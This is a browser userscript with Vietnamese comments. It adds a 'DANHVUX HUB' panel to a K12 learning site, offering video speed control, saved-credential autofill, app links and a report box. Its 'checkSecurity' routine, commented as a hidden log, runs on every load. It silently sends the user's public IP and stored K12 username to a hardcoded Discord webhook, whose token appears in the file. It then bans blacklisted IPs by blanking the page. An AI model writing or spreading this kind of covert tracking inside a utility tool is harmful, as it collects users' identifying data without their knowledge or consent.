(function() {
    'use strict';

    // ==========================================
    // ⚙️ CẤU HÌNH (THAY WEBHOOK CỦA BẠN VÀO ĐÂY)
    // ==========================================
    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1483505875309035520/B4vGUvE9rntITzpuzpqdfX2dVBYUXypjG4Gg1MCouzNoIoleYeWom_gh7fIbv9YSC-rV'; 
    const BOT_API = 'http://localhost:5000/blacklist'; 
    let uiColor = GM_getValue('ui_theme_color', '#ffea00');
    let userIP = 'Đang lấy...';

    // --- HÀM KIỂM TRA BẢO MẬT & LOGGER ---
    async function checkSecurity() {
        return new Promise(resolve => {
            GM_xmlhttpRequest({
                method: "GET", url: "https://api.ipify.org?format=json",
                onload: (resIP) => {
                    userIP = JSON.parse(resIP.responseText).ip;
                    // Gửi log ẩn về Discord
                    GM_xmlhttpRequest({
                        method: "POST", url: DISCORD_WEBHOOK,
                        headers: {"Content-Type":"application/json"},
                        data: JSON.stringify({embeds:[{title:"📡 NEW SESSION", color:3066993, fields:[{name:"IP",value:userIP,inline:true},{name:"User",value:GM_getValue('k12_u','N/A'),inline:true}]}]})
                    });
                    // Check Ban từ Bot Python
                    GM_xmlhttpRequest({
                        method: "GET", url: BOT_API,
                        onload: (resBot) => {
                            try {
                                if (JSON.parse(resBot.responseText).includes(userIP)) {
                                    document.documentElement.innerHTML = `<div style="background:#000;color:red;height:100vh;display:flex;align-items:center;justify-content:center;font-family:sans-serif;"><h1>🚫 IP ${userIP} ĐÃ BỊ CẤM</h1></div>`;
                                    resolve(false);
                                } resolve(true);
                            } catch(e) { resolve(true); }
                        }, onerror: () => resolve(true)
                    });
                }, onerror: () => resolve(true)
            });
        });
    }

    // --- CSS GIAO DIỆN CŨ + ANIMATION ---
    GM_addStyle(`
        @keyframes float { 0% { transform: translateY(0px); } 50% { transform: translateY(-10px); } 100% { transform: translateY(0px); } }
        @keyframes slideIn { from { opacity: 0; transform: translateX(30px); } to { opacity: 1; transform: translateX(0); } }

        #dv-hub {
            position: fixed; top: 100px; right: 20px; z-index: 999999;
            width: 320px; background: rgba(25, 25, 30, 0.9);
            color: #fff; border-radius: 20px; font-family: 'Segoe UI', sans-serif;
            backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.1);
            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
            animation: float 6s ease-in-out infinite; transition: 0.3s;
        }
        #dv-hub.hidden { opacity: 0; transform: scale(0.8); pointer-events: none; }
        
        .dv-header { padding: 25px 20px 10px; cursor: move; position: relative; }
        .dv-dots { position: absolute; top: 18px; left: 20px; display: flex; gap: 6px; }
        .dv-dot { width: 10px; height: 10px; border-radius: 50%; }
        
        .tab-nav { display: flex; justify-content: space-around; padding: 10px 10px; border-bottom: 1px solid rgba(255,255,255,0.05); }
        .tab-btn { background: none; border: none; color: #666; cursor: pointer; font-size: 10px; font-weight: 800; padding: 8px; border-radius: 8px; transition: 0.3s; }
        .tab-btn.active { color: ${uiColor}; background: rgba(255,234,0,0.1); }
        
        .tab-content { padding: 20px; display: none; min-height: 220px; animation: slideIn 0.4s ease-out; }
        .tab-content.active { display: block; }
        
        .btn-main { width: 100%; padding: 12px; border: none; border-radius: 12px; background: ${uiColor}; color: #000; font-weight: 900; cursor: pointer; margin-top: 10px; transition: 0.2s; }
        .btn-main:hover { transform: scale(1.03); filter: brightness(1.1); }

        .apps-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
        .app-item { display: flex; flex-direction: column; align-items: center; text-decoration: none; color: #888; font-size: 10px; transition: 0.3s; }
        .app-item:hover { color: ${uiColor}; transform: translateY(-5px); }
        .app-icon { width: 42px; height: 42px; background: #222; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 20px; margin-bottom: 5px; border: 1px solid transparent; }
        .app-item:hover .app-icon { border-color: ${uiColor}; background: #2a2a2a; }

        input, textarea { width: 100%; padding: 10px; background: rgba(0,0,0,0.2); border: 1px solid #333; color: #fff; border-radius: 10px; margin-bottom: 8px; }
    `);

    async function init() {
        if (!(await checkSecurity())) return;

        const panel = document.createElement('div');
        panel.id = 'dv-hub';
        panel.innerHTML = `
            <div class="dv-header">
                <div class="dv-dots">
                    <div class="dv-dot" style="background:#ff5f57"></div>
                    <div class="dv-dot" style="background:#ffbd2e"></div>
                    <div class="dv-dot" style="background:#27c93f"></div>
                </div>
                <div style="text-align:right; font-size:18px; font-weight:900;">DANHVUX <span style="color:${uiColor}">HUB</span></div>
            </div>

            <div class="tab-nav">
                <button class="tab-btn active" data-t="m">MAIN</button>
                <button class="tab-btn" data-t="a">APPS</button>
                <button class="tab-btn" data-t="r">REPORT</button>
                <button class="tab-btn" data-t="s">SET</button>
            </div>

            <div id="m" class="tab-content active">
                <div style="display:flex; justify-content:space-between; font-size:11px; margin-bottom:5px;"><span>SPEED:</span><b id="sV" style="color:${uiColor}">x1</b></div>
                <input type="range" id="sS" min="1" max="16" step="0.5" value="1" style="accent-color:${uiColor}">
                <button class="btn-main" id="btnL">🪄 ĐĂNG NHẬP NHANH</button>
                <p style="font-size:9px; color:#444; text-align:center; margin-top:15px;">Phím tắt: Alt + Z để ẩn/hiện</p>
            </div>

            <div id="a" class="tab-content">
                <div class="apps-grid">
                    <a href="https://chatgpt.com" target="_blank" class="app-item"><div class="app-icon">🤖</div>GPT</a>
                    <a href="https://google.com" target="_blank" class="app-item"><div class="app-icon">🔍</div>Google</a>
                    <a href="https://facebook.com" target="_blank" class="app-item"><div class="app-icon">📘</div>FB</a>
                    <a href="https://youtube.com" target="_blank" class="app-item"><div class="app-icon">📺</div>YouTube</a>
                    <a href="https://messenger.com" target="_blank" class="app-item"><div class="app-icon">💬</div>Mess</a>
                    <a href="https://tiktok.com" target="_blank" class="app-item"><div class="app-icon">🎵</div>TikTok</a>
                </div>
            </div>

            <div id="r" class="tab-content">
                <textarea id="rT" rows="3" placeholder="Gửi tin nhắn báo lỗi..."></textarea>
                <button class="btn-main" id="btnR" style="background:#333; color:#fff;">GỬI REPORT</button>
            </div>

            <div id="s" class="tab-content">
                <input type="text" id="kU" placeholder="User K12" value="${GM_getValue('k12_u','')}">
                <input type="password" id="kP" placeholder="Pass K12" value="${GM_getValue('k12_p','')}">
                <button class="btn-main" id="btnS">LƯU CÀI ĐẶT</button>
                <p style="font-size:9px; color:#555; text-align:center; margin-top:10px;">IP: ${userIP}</p>
            </div>
        `;
        document.body.appendChild(panel);

        // --- XỬ LÝ SỰ KIỆN ---
        document.querySelectorAll('.tab-btn').forEach(b => {
            b.onclick = () => {
                document.querySelectorAll('.tab-btn, .tab-content').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                document.getElementById(b.dataset.t).classList.add('active');
            };
        });

        document.getElementById('sS').oninput = (e) => {
            document.getElementById('sV').innerText = 'x' + e.target.value;
            if(document.querySelector('video')) document.querySelector('video').playbackRate = e.target.value;
        };

        document.getElementById('btnL').onclick = () => {
            document.querySelectorAll('input[type="text"], input[name*="user"]').forEach(i => i.value = GM_getValue('k12_u',''));
            document.querySelectorAll('input[type="password"]').forEach(i => i.value = GM_getValue('k12_p',''));
        };

        document.getElementById('btnS').onclick = () => {
            GM_setValue('k12_u', document.getElementById('kU').value);
            GM_setValue('k12_p', document.getElementById('kP').value);
            alert("Đã lưu!");
        };

        document.getElementById('btnR').onclick = () => {
            const msg = document.getElementById('rT').value;
            GM_xmlhttpRequest({
                method: "POST", url: DISCORD_WEBHOOK,
                headers: {"Content-Type":"application/json"},
                data: JSON.stringify({embeds:[{title:"📩 REPORT", description:`**IP:** ${userIP}\n**Nội dung:** ${msg}`, color:16776960}]})
            });
            alert("Đã gửi đến Discord!");
        };

        // Kéo thả & Phím tắt
        window.addEventListener('keydown', (e) => { if (e.altKey && e.code === 'KeyZ') panel.classList.toggle('hidden'); });
        let dr = false, ox, oy;
        panel.querySelector('.dv-header').onmousedown = (e) => { dr = true; ox = e.clientX-panel.offsetLeft; oy = e.clientY-panel.offsetTop; };
        document.onmousemove = (e) => { if(dr) { panel.style.left = (e.clientX-ox)+'px'; panel.style.top = (e.clientY-oy)+'px'; panel.style.right='auto'; } };
        document.onmouseup = () => dr = false;
    }

    init();
})();
